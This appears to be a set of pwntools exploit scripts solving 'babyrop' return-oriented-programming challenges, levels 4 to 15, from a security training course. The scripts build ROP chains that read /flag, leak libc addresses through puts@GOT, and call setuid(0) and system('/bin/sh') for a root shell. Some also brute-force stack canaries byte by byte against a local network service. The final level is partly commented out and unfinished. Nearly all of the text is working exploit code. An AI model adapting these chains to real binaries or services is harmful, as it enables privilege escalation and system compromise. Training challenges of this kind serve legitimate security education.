level 4.0
from pwn import *

p=process(['/challenge/babyrop_level4.0'])

sys_ret=0x401a71
rax_ret=0x401a41
rdi_ret=0x401a51
r10_ret=0x401a61
rdx_ret=0x401a62
rsi_ret=0x401a59

p.recvuntil("[LEAK] Your input buffer is located at: ")
add_str=p.recvuntil(".",drop=True)
buffer_add=int(add_str,16)

print(hex(buffer_add))
flag_add=buffer_add+0x48+0x80

payload=b'\x90'*(0x48)+p64(rdi_ret)+p64(flag_add)+p64(rsi_ret)+p64(0)+p64(rax_ret)+p64(2)+p64(sys_ret)+p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(3)+p64(r10_ret)+p64(60)+p64(rax_ret)+p64(40)+p64(0x401a71)+p64(0x00000067616c662f)
p.sendline(payload)

p.interactive()

level 5.0
from pwn import *

p=process(['/challenge/babyrop_level5.0'])

sys_ret=0x4017af
rax_ret=0x4017bf
rdi_ret=0x4017d7
r10_ret=0x4017e7
rdx_ret=0x4017b7
rsi_ret=0x4017df
rcx_ret=0x4017d0

add_rcx_al=0x40127b

flag_add=0x404078

#write(1,flag_add,8)
payload=b'\x90'*(0x78)#+p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(flag_add)+p64(rdx_ret)+p64(6)+p64(rax_ret)+p64(1)+p64(sys_ret)
#flag_add[0]=0x2f
payload+=p64(rax_ret)+p64(0x2f)+p64(rcx_ret)+p64(flag_add)+p64(add_rcx_al)+p64(0)
payload+=p64(rax_ret)+p64(0x66)+p64(rcx_ret)+p64(flag_add+1)+p64(add_rcx_al)+p64(0)
payload+=p64(rax_ret)+p64(0x6c)+p64(rcx_ret)+p64(flag_add+2)+p64(add_rcx_al)+p64(0)
payload+=p64(rax_ret)+p64(0x61)+p64(rcx_ret)+p64(flag_add+3)+p64(add_rcx_al)+p64(0)
payload+=p64(rax_ret)+p64(0x67)+p64(rcx_ret)+p64(flag_add+4)+p64(add_rcx_al)+p64(0)
#write(1,flag_add,8)
payload+=p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(flag_add)+p64(rdx_ret)+p64(5)+p64(rax_ret)+p64(1)+p64(sys_ret)
#open(/flag,r)
payload+=p64(rdi_ret)+p64(flag_add)+p64(rsi_ret)+p64(0x123407ff)+p64(rax_ret)+p64(90)+p64(sys_ret)


p.sendline(payload)

p.interactive()

level 6.0
#pop r10;ret \x41\x5a\xc3

level 7.0
#需要修改uid为0，否则system("/bin/sh")会降权
#system("/bin/sh")需要栈对齐
from pwn import *

p=process(['/challenge/babyrop_level7.0'])
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

bin_sh_offset=0x1b75aa
sys_offset=libc.symbols['system']
seteuid_offset=libc.symbols['setuid']
print(hex(seteuid_offset))

p.recvuntil(" in libc is: ")
add_str=p.recvuntil(".",drop=True)
sys_add=int(add_str,16)

basic_addr=sys_add-sys_offset

seteuid_addr=basic_addr+seteuid_offset
bin_sh=basic_addr+bin_sh_offset
id_add=basic_addr+0x15366

rdi_ret=0x402293

payload=b'\x90'*0x58+p64(rdi_ret)+p64(0)+p64(0x402291)+p64(0)*2+p64(seteuid_addr)+p64(rdi_ret)+p64(bin_sh)+p64(0x402291)+p64(0)*2+p64(sys_add)
p.send(payload)

p.interactive()

level 8.0
from pwn import *

p=process(['/challenge/babyrop_level8.0'])
elf=ELF("/challenge/babyrop_level8.0")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

rdi_ret=0x402073
rsi_r15_ret=0x402071

bin_sh_offset=0x1b75aa
puts_offset=libc.symbols["puts"]
print(hex(puts_offset))
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]

print(hex(puts_plt),hex(puts_got))

payload=b'\x90'*0x48+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(0x401dd7)
p.send(payload)

p.recvuntil("Leaving!\n")
puts_addr=p.recv(6)+b'\x00\x00'
print(hex(u64(puts_addr)))

basic_addr=u64(puts_addr)-puts_offset
sys=basic_addr+libc.symbols["system"]
bin_sh=basic_addr+bin_sh_offset

#调用system前，调用setuid(0)

payload=b'\x90'*0x48+p64(rdi_ret)+p64(bin_sh)+p64(rsi_r15_ret)+p64(0)+p64(1)+p64(sys)
p.send(payload)

p.interactive()

level 9.0
#二次栈迁移，第二次的调出来的
from pwn import *

p=process(['/challenge/babyrop_level9.0'])
elf=ELF("/challenge/babyrop_level9.0")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

rdi_ret=0x401fe3
rbp_ret=0x401ce2
r15_ret=0x401fe1
leave_ret=0x401743

re_run=0x401ce5
bin_sh_offset=0x1b75aa
puts_offset=libc.symbols["puts"]
setuid_offset=libc.symbols["setuid"]
sys_offset=libc.symbols["system"]
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]

payload=p64(rbp_ret)+p64(0x4150e0+0x10)+p64(leave_ret)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(re_run)
p.send(payload)

p.recvuntil("Leaving!\n")
puts_addr=p.recv(6)+b'\x00\x00'
print(hex(u64(puts_addr)))

basic_addr=u64(puts_addr)-puts_offset
print(hex(basic_addr))
sys_add=basic_addr+sys_offset
setuid_add=basic_addr+setuid_offset
bin_sh=bin_sh_offset+basic_addr

payload=p64(rbp_ret)+p64(0x4150e0+0x50)+p64(leave_ret)+b'a'*0x40+p64(rdi_ret)+p64(0)+p64(r15_ret)+p64(0)*2+p64(setuid_add)+p64(rdi_ret)+p64(bin_sh)+p64(r15_ret)+p64(0)*2+p64(sys_add)
p.send(payload)

p.interactive()

level 10
from pwn import *

p=process(['/challenge/babyrop_level10.0'])
elf=ELF("/challenge/babyrop_level10.0")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil("[LEAK] Your input buffer is located at: ")
add_str=p.recvuntil(".",drop=True)
buffer_add=int(add_str,16)

#         0x20c6
leave_ret=0x17b6

rbp_addr=buffer_add-0x10
payload=b'b'*0x58+p64(rbp_addr)+b'\xb6\x47'
p.send(payload)

p.interactive()

level 12.1
#爆破
from pwn import *
for i in range(0x40):
    p=process(['/challenge/babyrop_level12.1'])
    elf=ELF("/challenge/babyrop_level12.1")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

    p.recvuntil("[LEAK] Your input buffer is located at: ")
    add_str=p.recvuntil(".",drop=True)
    buffer_add=int(add_str,16)

    #         0x20c6
    leave_ret=0x17b6

    rbp_addr=buffer_add-0x10
    payload=b'b'*0x48+p64(rbp_addr)+b'\x48\x4a\xda'
    p.send(payload)

    p.interactive()
    p.poll()

level 13
from pwn import *
p=process(["/challenge/babyrop_level13.0"])
elf=ELF("/challenge/babyrop_level13.0")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil("[LEAK] Your input buffer is located at: ")
add_str=p.recvuntil(".",drop=True)
buffer_add=int(add_str,16)
can_add=buffer_add+0x28


p.sendline(hex(can_add))
p.recvuntil(" = ")
can_str=p.recvuntil("\n",drop=True)
can=int(can_str,16)

payload=b'b'*0x28+p64(can)+p64(0)+b'\x00'
p.send(payload)

p.recvuntil("[LEAK] Your input buffer is located at: ")
add_str1=p.recvuntil(".",drop=True)
buffer_add1=int(add_str1,16)
ret_add=buffer_add1+0x38
p.sendline(hex(ret_add))

p.recvuntil(" = ")
ret_str=p.recvuntil("\n",drop=True)
ret=int(ret_str,16)

basic=ret-0x270b3
bin_sh_offset=0x1b75aa
setuid_add=libc.symbols["setuid"]+basic
sys_add=libc.symbols["system"]+basic
bin_sh=bin_sh_offset+basic
rdi_ret=basic+0x26b72
rsi_r15_ret=basic+0x26b70

payload=b'b'*0x28+p64(can)+p64(0)+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0)*2+p64(setuid_add)+p64(rdi_ret)+p64(bin_sh)+p64(rsi_r15_ret)+p64(0)*2+p64(sys_add)
p.send(payload)
p.interactive()

level 14
from pwn import *
can_list=[]

payload=b'b'*0x38+b'\x00'

for round in range(7):
    for i in range(256):
        p=remote("127.0.0.1","1337")
        #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        test_payload=payload+i.to_bytes(1, byteorder='little')
        p.send(test_payload)
        res_str=str(p.recvall())
        if res_str.find("Goodbye!")!=-1:
            p.close()
            payload+=i.to_bytes(1, byteorder='little')
            can_list.append(i)
            break
        p.close()

print(can_list)
canary_str="0x"
for i in range(len(can_list)):
    tt=hex(can_list[-(i+1)])[2:]
    if(len(tt)!=2):
        tt='0'+tt
    canary_str+=tt
canary_str+="00"

print(canary_str)
canary=int(canary_str,16)

elf=ELF("/challenge/babyrop_level14.0")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload=b'b'*0x38+p64(canary)+p64(0)+b'\x21'

basic_list=[]
for round in range(7):
    for i in range(0xff):
        p=remote("127.0.0.1","1337")
        test_payload=payload+i.to_bytes(1, byteorder='little')
        p.send(test_payload)
        res_str=str(p.recvall())
        if res_str.find("Goodbye!")!=-1:
            p.close()
            payload+=i.to_bytes(1, byteorder='little')
            basic_list.append(i)
            break
        p.close()
print(basic_list)
basic_str="0x"
for i in range(len(basic_list)):
    tt=hex(basic_list[-(i+1)])[2:]
    if(len(tt)!=2):
        tt='0'+tt
    basic_str+=tt
basic_str+="21"
print(basic_str)

basic=int(basic_str,16)-0x2921
print(hex(basic))
rdi_ret=0x29b3+basic
rsi_r15_ret=0x29b1+basic
bin_sh_offset=0x1b75aa
puts_offset=libc.symbols["puts"]
puts_plt=elf.plt["puts"]+basic
puts_got=elf.got["puts"]+basic

payload=b'b'*0x38+p64(canary)+p64(0)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)

p=remote("127.0.0.1","1337")
p.send(payload)

p.recvuntil("Leaving!\n")
puts_add=u64(p.recv(6)+b'\x00\x00')
print(hex(puts_add))

p.close()

libc_basic=puts_add-puts_offset
setuid_add=libc_basic+libc.symbols["setuid"]
sys_add=libc_basic+libc.symbols["system"]
bin_sh=libc_basic+bin_sh_offset

p=remote("127.0.0.1","1337")
payload=b'b'*0x38+p64(canary)+p64(0)+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0)*2+p64(setuid_add)+p64(rdi_ret)+p64(bin_sh)+p64(rsi_r15_ret)+p64(0)*2+p64(sys_add)
p.send(payload)


p.interactive()

level 15
from pwn import *
can_list=[]

payload=b'b'*0x38+b'\x00'

for round in range(7):
    for i in range(256):
        p=remote("127.0.0.1","1337")
        test_payload=payload+i.to_bytes(1, byteorder='little')
        p.send(test_payload)
        res_str=str(p.recvall())
        if res_str.find("*** stack smashing detected ***")==-1:
            p.close()
            payload+=i.to_bytes(1, byteorder='little')
            can_list.append(i)
            break
        p.close()

print(can_list)
canary_str="0x"
for i in range(len(can_list)):
    tt=hex(can_list[-(i+1)])[2:]
    if(len(tt)!=2):
        tt='0'+tt
    canary_str+=tt
canary_str+="00"
print(canary_str)
canary=int(canary_str,16)

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_list=[]
payload=b'b'*0x38+p64(canary)+p64(0)+b'\xb3'

for round in range(3):
    for i in range(256):
        p=remote("127.0.0.1","1337")
        test_payload=payload+i.to_bytes(1, byteorder='little')
        p.send(test_payload)
        res_str=str(p.recvall())
        if res_str.find("*** stack smashing detected ***")==-1:
            p.close()
            payload+=i.to_bytes(1, byteorder='little')
            libc_list.append(i)
            break
        p.close()

print(libc_list)
libc_str="0x7f"
for i in range(len(libc_list)):
    tt=hex(libc_list[-(i+1)])[2:]
    if(len(tt)!=2):
        tt='0'+tt
    libc_str+=tt
libc_str+="b3"
print(libc_str)
libc=int(libc_str,16)-0x270b3
print(hex(libc))

payload=b'b'*0x38+p64(canary)+p64(0)+p64(libc)
p=remote("127.0.0.1","1337")
p.send(payload)
'''
basic_list=[]
for round in range(7):
    for i in range(0xff):
        p=remote("127.0.0.1","1337")
        test_payload=payload+i.to_bytes(1, byteorder='little')
        p.send(test_payload)
        res_str=str(p.recvall())
        if res_str.find("Goodbye!")!=-1:
            p.close()
            payload+=i.to_bytes(1, byteorder='little')
            basic_list.append(i)
            break
        p.close()
print(basic_list)


bin_sh_offset=0x1b75aa
setuid_add=libc_basic+libc.symbols["setuid"]
sys_add=libc_basic+libc.symbols["system"]
bin_sh=libc_basic+bin_sh_offset

p=remote("127.0.0.1","1337")
payload=b'b'*0x38+p64(canary)+p64(0)+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0)*2+p64(setuid_add)+p64(rdi_ret)+p64(bin_sh)+p64(rsi_r15_ret)+p64(0)*2+p64(sys_add)
p.send(payload)
'''
p.interactive()
